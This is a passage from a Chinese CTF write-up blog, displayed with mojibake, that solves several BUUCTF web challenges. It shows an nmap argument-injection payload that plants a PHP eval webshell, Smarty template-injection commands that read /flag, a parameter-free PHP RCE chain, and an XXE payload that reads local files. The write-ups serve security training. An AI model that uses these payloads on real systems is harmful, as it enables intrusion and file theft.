<li><p><strong>å½“ç”¨æˆ·è¾“å…¥åŒ…å«å•å¼•å·æ—¶ï¼Œå…ˆç”¨escapeshellarg()å¤„ç†ä¼šç»™è¯¥å•å¼•å·æ·»åŠ è½¬ä¹‰ç¬¦ï¼Œå†ç”¨escapeshellcmd()å¤„ç†æ—¶ä¼šå°†è¯¥æ·»åŠ çš„è½¬ä¹‰ç¬¦å†æ·»åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ï¼Œä»è€Œå¯¼è‡´å•å¼•å·è¢«é€ƒé€¸æ‰ï¼Œä»è€Œé€ æˆå‚æ•°æ³¨å…¥æ¼æ´çš„å­˜åœ¨ï¼›</strong></p>
</li>
<li><p>å¦‚æœæ˜¯å…ˆç”¨escapeshellcmd()å‡½æ•°è¿‡æ»¤ï¼Œå†ç”¨escapeshellarg()å‡½æ•°è¿‡æ»¤ï¼Œåˆ™ä¸å­˜åœ¨å‚æ•°æ³¨å…¥æ¼æ´ï¼›</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#ï¼ˆå¯ä»¥åŠ ç‚¹ä¸œè¥¿</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<p><code>-oG</code> å‚æ•°ç”¨äºå°† <code>nmap</code> çš„æ‰«æç»“æœä»¥ Grepable æ ¼å¼è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -oG &lt;output_file&gt; [å…¶ä»–æ‰«æå‚æ•°] &lt;ç›®æ ‡ä¸»æœºæˆ–ç½‘ç»œ&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>&lt;output_file&gt;</code>ï¼šè¿™æ˜¯æŒ‡å®šçš„è¾“å‡ºæ–‡ä»¶åï¼Œæ‰«æç»“æœä¼šè¢«ä¿å­˜åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</li>
<li><code>[å…¶ä»–æ‰«æå‚æ•°]</code>ï¼šå¯ä»¥åŒ…å« <code>nmap</code> çš„å„ç§æ‰«æé€‰é¡¹ï¼Œä¾‹å¦‚ <code>-sT</code>ï¼ˆTCP è¿æ¥æ‰«æï¼‰ã€<code>-F</code>ï¼ˆå¿«é€Ÿæ‰«æï¼Œåªæ‰«æå¸¸è§çš„ 100 ä¸ªç«¯å£ï¼‰ç­‰ã€‚</li>
<li><code>&lt;ç›®æ ‡ä¸»æœºæˆ–ç½‘ç»œ&gt;</code>ï¼šå¯ä»¥æ˜¯å•ä¸ª IP åœ°å€ã€IP åœ°å€èŒƒå›´æˆ–è€…åŸŸåç­‰ã€‚</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string single-quoted-string">' ã€Š?php @eval($_POST["pass"]);?&gt; -oG pass.php '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://122b544d-074b-44b4-8d5d-131449927350.node5.buuoj.cn/e6305cd14dbe6e1fc4041d81cb3fc9ee/pass.php">122b544d-074b-44b4-8d5d-131449927350.node5.buuoj.cn/e6305cd14dbe6e1fc4041d81cb3fc9ee/pass.php</a></p>
<p>[BUUCTF 2018 Online Tool | Kid](<a target="_blank" rel="noopener" href="https://nkcell.github.io/2019/09/10/BUUCTF">https://nkcell.github.io/2019/09/10/BUUCTF</a> 2018  Online Tool/)</p>
<p>ä¸çŸ¥æ˜¯ä¸æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œæˆ‘æŒ‰ä¸Šæ–¹æ–‡ç« å®éªŒescapeshellarg()ä¸escapeshellcmd()å´è¾¾åˆ°ä¸äº†æƒ³è¦çš„æ•ˆæœ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">ã€Š?php
$host = "' <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> -oG pass.php '";
$host = escapeshellarg($host);
echo $host;
echo "\n";
$host = escapeshellcmd($host);
echo $host;

" <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> -oG pass.php "
^" ^<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>^?php</span> <span class="token attr-name">phpinfo^(^)^;^?^</span><span class="token punctuation">&gt;</span></span> -oG pass.php ^"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ‰æ— ä¸€æ ·çš„å‹å‹ï¼Ÿ</p>
<hr>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>å˜¶~ï¼Œä½†æˆ‘çœ‹äº†çœ‹æˆ‘IPä¸æ˜¯è¿™ä¸ªå‘€ï¼ˆ</p>
<pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: xaxaxa
Your IP is : xaxaxa	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><del>æœç„¶ä¸é è°±ï¼ˆ</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d2bfef660a8dbbc2293e833c8c858b89.png"></p>
<p>æ‰€ä»¥ä¸æ˜¯flaskè¯¥å’‹åŠï¼Ÿ</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14141">æ–‡ç«  - PHPä¸­çš„æ¨¡æ¿æ³¨å…¥æ¼æ´åˆ¨æ - å…ˆçŸ¥ç¤¾åŒº</a></p>
<p>è¯•äº†ä¸€ä¸‹ä¸æ˜¯Twig,æ˜¯Smartyï¼ˆ<code>{$smarty.version}</code>ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">{system('ls /')} 
{system('cat /flag')} 
flag{7dd4f5f5-a7dd-43f8-b966-4c180f72af17}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0aa3233bf98122217b8d372ac0a13cc2.png"></p>
<p>è¯´å®è¯ç»™æˆ‘çœ‹å‚»äº†ï¼Œå’‹ä¸€å †gitï¼ˆ</p>
<p>GitHackå¯åŠ¨ï¼ˆ<code>python2 GitHack.py http://9211086e-5637-4026-a306-d75d0b458824.node5.buuoj.cn:81/.git/</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">ã€Š<span class="token operator">?</span>php
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token comment">//[a-z,_]+ï¼š</span>
<span class="token comment">//[ ] ä¸ºå­—ç¬¦ç±»ï¼Œç”¨äºåŒ¹é…æ–¹æ‹¬å·å†…æŒ‡å®šçš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚</span>
<span class="token comment">//a-z è¡¨ç¤ºåŒ¹é…æ‰€æœ‰å°å†™å­—æ¯ã€‚</span>
<span class="token comment">//,_ è¡¨ç¤ºåŒ¹é…é€—å· , æˆ–ä¸‹åˆ’çº¿ _ã€‚</span>
<span class="token comment">//+ æ˜¯é‡è¯ï¼Œæ„å‘³ç€å‰é¢çš„å­—ç¬¦ç±»è‡³å°‘å‡ºç°ä¸€æ¬¡ã€‚ç»¼åˆèµ·æ¥ï¼Œ[a-z,_]+ ç”¨äºåŒ¹é…ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå°å†™å­—æ¯ã€é€—å·æˆ–ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œé€šå¸¸å¯¹åº”å‡½æ•°åã€‚</span>
<span class="token comment">//\(`**ï¼š     - ç”±äºæ‹¬å·åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œæ‰€ä»¥ä½¿ç”¨åæ–œæ  `\` è¿›è¡Œè½¬ä¹‰ï¼Œè¿™é‡Œè¡¨ç¤ºåŒ¹é…å·¦æ‹¬å· `(`ï¼Œç”¨äºæ ‡è¯†å‡½æ•°è°ƒç”¨çš„èµ·å§‹ã€‚`(?R)?`ï¼š - `(?R)` æ˜¯é€’å½’å¼•ç”¨è¯­æ³•ï¼Œå®ƒä¼šé€’å½’åœ°å¼•ç”¨æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼æœ¬èº«ã€‚åœ¨è¿™ä¸ªæƒ…å¢ƒä¸‹ï¼Œç”¨äºåŒ¹é…å‡½æ•°å†…éƒ¨å¯èƒ½åµŒå¥—çš„å‡½æ•°è°ƒç”¨ã€‚     - `?` æ˜¯é‡è¯ï¼Œè¡¨ç¤ºå‰é¢çš„å…ƒç´ ï¼ˆå³é€’å½’å¼•ç”¨éƒ¨åˆ†ï¼‰å¯ä»¥å‡ºç° 0 æ¬¡æˆ– 1 æ¬¡ï¼Œæ„å‘³ç€å‡½æ•°è°ƒç”¨å¯ä»¥åµŒå¥—ï¼Œä¹Ÿå¯ä»¥ä¸åµŒå¥—ã€‚  - **`\)ï¼š</span>
<span class="token comment">//åŒæ ·ä½¿ç”¨åæ–œæ  \ å¯¹å³æ‹¬å·è¿›è¡Œè½¬ä¹‰ï¼Œç”¨äºåŒ¹é…å‡½æ•°è°ƒç”¨ç»“æŸçš„å³æ‹¬å· )ã€‚</span>
 <span class="token comment">//(?R) æ˜¯é€’å½’å¼•ç”¨ï¼Œå®ƒåªèƒ½åŒ¹é…å’Œæ›¿æ¢åµŒå¥—çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸èƒ½å¤„ç†å‡½æ•°å‚æ•°ã€‚</span>
   <span class="token comment">// scandir()å¯ä»¥ä½¿ç”¨é‡Œé¢ä¸å«å‚æ•°</span>
<span class="token comment">//scandir('1')ä¸å¯ä»¥ä½¿ç”¨ï¼Œé‡Œé¢å«æœ‰å‚æ•°1ï¼Œæ— æ³•è¢«æ›¿æ¢åˆ é™¤</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/133808536#:~:text=%E7%9B%AE%E5%BD%95%E6%97%A0%E5%8F%82%E6%95%B0RCE%E9%A2%98%E7%9B%AE%E7%89%B9%E5%BE%81%EF%BC%9A%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%EF%BC%9A%E2%80%A6">æ— å‚æ•°RCEç»•è¿‡çš„è¯¦ç»†æ€»ç»“ï¼ˆå…­ç§æ–¹æ³•ï¼‰_æ— å‚æ•°çš„å–årce-CSDNåšå®¢</a></p>
<p>æ–‡ç« æœ‰å…·ä½“å†™</p>
<p>åœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿé‡Œï¼Œç‚¹å·ï¼ˆ<code>.</code>ï¼‰æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è·¯å¾„è¡¨ç¤ºï¼Œå®ƒä»£è¡¨å½“å‰å·¥ä½œç›®å½•ã€‚<code>scandir()</code> å‡½æ•°ä¼šå°†å…¶è§£é‡Šä¸ºå½“å‰å·¥ä½œç›®å½•ï¼Œå¹¶å¯¹è¯¥ç›®å½•è¿›è¡Œæ‰«æã€‚ <code>.</code>è¡¨ç¤ºå½“å‰ç›®å½•æœ¬èº«ï¼Œ<code>..</code> è¡¨ç¤ºçˆ¶ç›®å½•ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-localeconv.html">PHP localeconv() å‡½æ•° | èœé¸Ÿæ•™ç¨‹</a></p>
<p>localeconv():è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„,è¯¥æ•°ç»„çš„ç¬¬ä¸€é¡¹å°±æ˜¯â€™.â€™(è¿™ä¹Ÿå¤ªå·§äº†å§ï¼Œä¸€èˆ¬ä¹ŸçŒœä¸åˆ°)</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e0593316e12840a8e64914fd4b01fc4a.png"></p>
<blockquote>
<p>scandir() :å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•åç§°ï¼ˆglob()å¯æ›¿æ¢ï¼‰<br>localeconv() ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ï¼ˆä½†æ˜¯è¿™é‡Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯â€˜.â€™ï¼Œè¿™ä¸ª.çš„ç”¨å¤„å¾ˆå¤§ï¼‰<br>current() ï¼šè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚pos()å’Œcurrent()æ˜¯åŒä¸€ä¸ªä¸œè¥¿<br>getcwd() :å–å¾—å½“å‰å·¥ä½œç›®å½•<br>dirname():å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†<br>array_flip() :äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„<br>array_rand() :ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</p>
<p>array_reverse():å°†æ•°ç»„å†…å®¹åè½¬</p>
<p>strrev():ç”¨äºåè½¬ç»™å®šå­—ç¬¦ä¸²</p>
<p>getcwd()ï¼šè·å–å½“å‰å·¥ä½œç›®å½•è·¯å¾„</p>
<p>dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br>chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</p>
<p>eval()ã€assert()ï¼šå‘½ä»¤æ‰§è¡Œ</p>
<p>hightlight_file()ã€show_source()ã€readfile()ï¼šè¯»å–æ–‡ä»¶å†…å®¹</p>
<p>end() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br>next() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br>prev() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br>reset() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br>each() ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</p>
</blockquote>
<p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p>
<hr>
<p>orç”¨session_id .ä½¿ç”¨æ¡ä»¶ï¼šå½“è¯·æ±‚å¤´ä¸­æœ‰cookieæ—¶ï¼ˆæˆ–è€…èµ°æŠ•æ— è·¯æ‰‹åŠ¨æ·»åŠ cookieå¤´ä¹Ÿè¡Œï¼Œæœ‰äº›CTFé¢˜ä¸ä¼šå¡ï¼‰</p>
<p> é¦–å…ˆæˆ‘ä»¬éœ€è¦å¼€å¯session_start()æ¥ä¿è¯session_id()çš„ä½¿ç”¨ï¼Œsession_idå¯ä»¥ç”¨æ¥è·å–å½“å‰ä¼šè¯IDï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¯ä»¥æŠ“å–PHPSESSIDåé¢çš„ä¸œè¥¿ï¼Œä½†æ˜¯phpsessionä¸å…è®¸()å‡ºç°</p>
<p>readfile(session_id(session_start()));</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2ff73e9f63c038fbb87aa5fdc1686fdc.png"></p>
<p>åœ¨æºä»£ç </p>
<hr>
<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">doLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> password <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Please enter the username and password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">"&lt;user&gt;&lt;username&gt;"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"&lt;/username&gt;&lt;password&gt;"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"&lt;/password&gt;&lt;/user&gt;"</span><span class="token punctuation">;</span> 
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"doLogin.php"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">"application/xml;charset=utf-8"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"xml"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">anysc</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//è¿™é‡Œå­˜åœ¨æ‹¼å†™é”™è¯¯ï¼Œæ­£ç¡®çš„åº”è¯¥æ˜¯ async: false(å“ˆï¼Ÿ)</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        	<span class="token keyword">var</span> code <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
        	<span class="token keyword">var</span> msg <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">;</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login fail!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>code <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>msg <span class="token operator">+</span> <span class="token string">" login success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        		<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">"error:"</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        	<span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">XMLHttpRequest<span class="token punctuation">,</span>textStatus<span class="token punctuation">,</span>errorThrown</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">".msg"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>errorThrown <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> textStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Fake XML cookbook&gt;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9302528.html">XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰æ³¨å…¥è¯¦è§£ - æ¸—é€æµ‹è¯•ä¸­å¿ƒ - åšå®¢å›­</a></p>
<p>å¥½é•¿ï¼ˆğŸ˜“ğŸ˜°</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c85daba0fa2608792507c6814ab6be7d.png"></p>
<p>usernameè¿™é‡Œå¯</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> 

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span><span class="token punctuation">&gt;</span></span>

&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>


<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>xaxaxa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag{601aea4d-8dfc-4651-a212-0271dcf90759}</p>
<hr>
